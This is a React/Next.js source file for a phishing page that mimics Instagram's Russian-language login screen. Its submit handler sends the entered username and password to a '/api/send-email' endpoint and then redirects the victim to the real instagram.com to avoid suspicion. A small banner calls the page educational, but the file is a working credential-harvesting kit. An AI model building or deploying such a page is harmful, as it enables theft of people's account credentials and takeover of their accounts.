'use client'

import { redirect } from 'next/navigation'
import { useState } from 'react'

export default function Login() {
  const [isClosed, setIsClosed] = useState(false)

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault()

    const form = e.target as HTMLFormElement
    const username = (form[0] as HTMLInputElement).value
    const password = (form[1] as HTMLInputElement).value

    try {
      const res = await fetch('/api/send-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: username,
          password: password,
        }),
      })

      const result = await res.json()
      redirect('https://instagram.com')
    } catch (err) {
      console.error(err)
      // alert('Ошибка сети')
    } finally {
      redirect('https://instagram.com')
    }
  }

  return (
    <div className="flex flex-col justify-between min-h-screen bg-gray-50 text-sm text-gray-500">
      {/* Основна частина */}
      <div className="flex justify-center items-center flex-1">
        {/* Попередження */}
        {!isClosed && (
          <div className="top-12 opacity-70 text-xl px-2 absolute text-center text-black border border-red-600 bg-red-200 py-3 mb-6 rounded-md shadow-sm">
            <div
              className="absolute top-0 right-1 cursor-pointer"
              onClick={() => setIsClosed(true)}
            >
              X
            </div>
            ⚠️ Ця сторінка створена лише в навчальних цілях ⚠️
          </div>
        )}

        {/* Блок зображення */}
        <div className="hidden lg:flex mr-8 relative">
          <div className="w-[470px] h-[450px] bg-[url('/landing-2x.png')] bg-cover bg-center rounded-md relative"></div>
        </div>

        {/* Блок форми */}
        <div className="flex flex-col items-center">
          {/* Форма входу */}
          <div className="w-[350px]  flex flex-col items-center pt-10 pb-6 mb-3 rounded-sm">
            <h1 className="font-logo text-gray-900 text-5xl mb-8">Instagram</h1>

            <form className="flex flex-col w-[270px]" onSubmit={handleSubmit}>
              <input
                type="text"
                name="username"
                placeholder="Телефон, имя пользователя или эл. адрес"
                className="border border-gray-300 bg-gray-50 text-sm rounded-sm px-2 py-2 mb-2 focus:outline-none focus:border-gray-400"
              />
              <input
                type="password"
                name="password"
                placeholder="Пароль"
                className="border border-gray-300 bg-gray-50 text-sm rounded-sm px-2 py-2 mb-3 focus:outline-none focus:border-gray-400"
              />
              <button
                type="submit"
                className="cursor-pointer bg-[#0095f6] text-white text-sm font-semibold py-1.5 rounded-md hover:bg-[#1877f2] transition-colors"
              >
                Войти
              </button>
            </form>

            <div className="flex items-center w-[270px] my-4">
              <div className="flex-grow border-t border-gray-300"></div>
              <span className="mx-3 text-gray-500 text-sm font-semibold">ИЛИ</span>
              <div className="flex-grow border-t border-gray-300"></div>
            </div>

            <button className="flex cursor-pointer items-center justify-center text-[#385185] font-semibold text-sm mb-4">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-4 w-4 mr-2"
                fill="currentColor"
                viewBox="0 0 24 24"
              >
                <path d="M22.675 0h-21.35C.596 0 0 .597 0 1.333v21.333C0 23.403.596 24 1.325 24h11.495v-9.294H9.847v-3.622h2.973V8.413c0-2.937 1.792-4.54 4.415-4.54 1.255 0 2.333.093 2.646.135v3.066l-1.816.001c-1.425 0-1.7.678-1.7 1.67v2.19h3.398l-.444 3.622h-2.954V24h5.789C23.404 24 24 23.403 24 22.667V1.333C24 .597 23.404 0 22.675 0z" />
              </svg>
              Войти через Facebook
            </button>

            <a href="#" className="text-xs text-[#00376b] hover:underline">
              Забыли пароль?
            </a>
          </div>

          {/* Блок регистрации */}
          <div className="w-[350px] border border-gray-300 bg-white text-sm text-center py-4 rounded-sm">
            У вас ещё нет аккаунта?{' '}
            <a href="#" className="text-[#0095f6] font-semibold">
              Зарегистрироваться
            </a>
          </div>
        </div>
      </div>

      {/* Футер */}
      <footer className="flex flex-col items-center py-6 space-y-2 text-xs text-gray-400">
        <div className="flex flex-wrap justify-center gap-3 px-4">
          <a href="#" className="hover:underline">
            Meta
          </a>
          <a href="#" className="hover:underline">
            Информация
          </a>
          <a href="#" className="hover:underline">
            Блог
          </a>
          <a href="#" className="hover:underline">
            Вакансии
          </a>
          <a href="#" className="hover:underline">
            Помощь
          </a>
          <a href="#" className="hover:underline">
            API
          </a>
          <a href="#" className="hover:underline">
            Конфиденциальность
          </a>
          <a href="#" className="hover:underline">
            Условия
          </a>
          <a href="#" className="hover:underline">
            Места
          </a>
          <a href="#" className="hover:underline">
            Instagram Lite
          </a>
          <a href="#" className="hover:underline">
            Threads
          </a>
          <a href="#" className="hover:underline">
            Meta Verified
          </a>
        </div>
        <div className="text-center text-gray-400">
          Русский © 2025 Instagram from Meta
        </div>
      </footer>
    </div>
  )
}
